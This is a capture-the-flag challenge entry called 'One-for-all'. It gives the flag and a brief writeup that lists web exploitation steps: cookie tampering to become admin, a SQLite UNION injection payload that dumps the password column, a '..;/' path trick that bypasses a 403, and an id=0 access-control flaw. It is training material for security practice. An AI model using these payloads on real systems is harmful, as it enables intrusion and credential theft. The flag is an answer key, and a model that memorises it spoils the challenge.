### Challenge Name
One-for-all

### Description
One for all or all for one?

### Difficulty
6/10

### Flag
PCTF{Hang_l00s3_and_Adm1t_ev3rYtH1nG}

### Hints
N/A

### Author
Kiran Ghimire

### Tester
Tested by <>

### Writeup
The flag is divided into four parts.

1. Change cookie value to admin of key name
2. SQlite injection in user name field
3. Query: 4180" UNION ALL SELECT 1,2,3,group_concat(password) from accounts--
4. 403 bypass: "/secretsforyou/..;/"
5. Change id to 0: /user?id=0

